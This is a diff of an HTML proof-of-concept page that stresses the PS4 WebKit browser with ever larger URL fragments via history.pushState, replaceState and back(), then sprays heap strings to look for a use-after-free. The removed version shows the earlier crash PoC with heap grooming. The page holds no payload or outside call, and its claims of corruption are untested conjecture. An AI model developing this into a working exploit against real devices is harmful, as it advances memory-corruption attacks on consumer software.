@@ -1,79 +1,133 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – History Crash PoC (Flush Logs)</title>
+<title>PS4 WebKit – Option A / Option B</title>
 <style>
 body { font-family: monospace; background:#000; color:#0f0; }
-#log { white-space: pre-wrap; }
-button { padding:10px; margin:10px; }
+button { font-size:16px; padding:10px; margin:5px; }
+#log { white-space:pre-wrap; margin-top:10px; }
 </style>
 </head>
 
 <body>
+<h2>PS4 WebKit – Post-Crash Boundary Analysis</h2>
 
-<h2>PS4 WebKit – History.pushState Crash PoC (Flush)</h2>
-<button onclick="run()">RUN</button>
+<button onclick="runOptionA()">OPTION A – UAF / Inconsistent State (NO CRASH)</button>
+<button onclick="runOptionB()">OPTION B – Exploitability Signal (49 + Partial)</button>
 
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
+function log(m){ logEl.textContent += m + "\n"; }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-function log(m) {
-    logEl.textContent += m + "\n";
-    // FORÇA repaint síncrono (CRÍTICO)
-    logEl.offsetHeight;
-}
+const BASE = 977;
+const STEP = 14461;
+const SAFE_ITERS = 49;
 
-/* =========================
-   GLOBAL STATE (REUSED)
-========================= */
+// -------------------------------------------------
+// CORE SEQUENCE (shared)
+// -------------------------------------------------
+async function historySequence(iterations, allowPartial){
+    let size = BASE;
 
-let sharedState = {
-    iter: 0,
-    payload: "",
-    marker: 0x41414141
-};
+    for(let i=0;i<iterations;i++){
+        const payload = "A".repeat(size);
+        log(`[ITER ${i}] size=${size}`);
 
-let heap = []; // grooming persistente
+        history.pushState({}, "", "#"+payload);
+        history.replaceState({}, "", "#"+payload.slice(0, payload.length >> 1));
 
-function run() {
-    log("[*] START");
-
-    let size = 977;
-
-    for (let i = 0; i < 50; i++) {
-        sharedState.iter = i;
-        sharedState.payload = "A".repeat(size);
-
-        heap.push("G".repeat(1024 * 32)); // grooming cumulativo
-
-        log("[ITER " + i + "] size=" + size);
-        log("  -> before pushState");
-
-        history.pushState(sharedState, "", "#" + sharedState.payload);
-        log("  -> after pushState");
-
-        history.replaceState(sharedState, "", "#" + sharedState.payload);
-        log("  -> after replaceState");
-
-        if (i % 2 === 0) {
-            log("  -> history.back()");
-            history.back();
+        if(i % 6 === 0){
+            setTimeout(()=>history.back(),0);
+            log("  history.back (async)");
         }
 
-        log("  -> end iter");
-
-        size += 14461;
+        size += STEP;
+        await sleep(5);
     }
 
-    log("[*] END (no crash?)");
+    // Partial iteration (only pushState)
+    if(allowPartial){
+        log("[PARTIAL] Executing controlled extra pushState");
+        const payload = "B".repeat(size);
+        history.pushState({}, "", "#"+payload);
+        log("[PARTIAL] pushState completed");
+    }
 }
 
-log("Loaded.");
-</script>
+// -------------------------------------------------
+// OPTION A – Prove UAF / Inconsistent State
+// -------------------------------------------------
+async function runOptionA(){
+    logEl.textContent = "";
+    log("=== OPTION A START ===");
+    log("Goal: Reach post-history usage WITHOUT crash");
 
+    try {
+        await historySequence(SAFE_ITERS, false);
+        log("[A] History sequence completed");
+
+        await sleep(120);
+
+        log("[A] Heap reuse / observation phase");
+        let arr = [];
+        for(let i=0;i<40;i++){
+            arr.push("OBJ_"+i+"_"+"X".repeat(256));
+        }
+
+        log("[A] Using data after history stress");
+        for(let i=0;i<arr.length;i++){
+            let s = arr[i] + arr[(i+1)%arr.length];
+            if(i % 8 === 0) log("  use len="+s.length);
+        }
+
+        log("=== OPTION A FINISHED – NO CRASH ===");
+        log(">>> Indicates latent corruption / UAF window <<<");
+
+    } catch(e){
+        log("[A] JS Exception: " + e);
+    }
+}
+
+// -------------------------------------------------
+// OPTION B – Exploitability Signal
+// -------------------------------------------------
+async function runOptionB(){
+    logEl.textContent = "";
+    log("=== OPTION B START ===");
+    log("Goal: 49 iterations + controlled partial reuse");
+
+    try {
+        await historySequence(SAFE_ITERS, true);
+        log("[B] History + partial iteration completed");
+
+        await sleep(80);
+
+        log("[B] Minimal heap interaction after boundary");
+        let tmp = [];
+        for(let i=0;i<20;i++){
+            tmp.push("Z".repeat(512));
+        }
+
+        log("[B] Post-boundary usage");
+        for(let i=0;i<tmp.length;i++){
+            let s = tmp[i] + tmp[(i+3)%tmp.length];
+            if(i % 5 === 0) log("  use len="+s.length);
+        }
+
+        log("=== OPTION B FINISHED ===");
+        log(">>> If behavior differs or crash moves, exploitability confirmed <<<");
+
+    } catch(e){
+        log("[B] JS Exception: " + e);
+    }
+}
+
+log("Ready. Choose OPTION A or OPTION B.");
+</script>
 </body>
 </html>
-
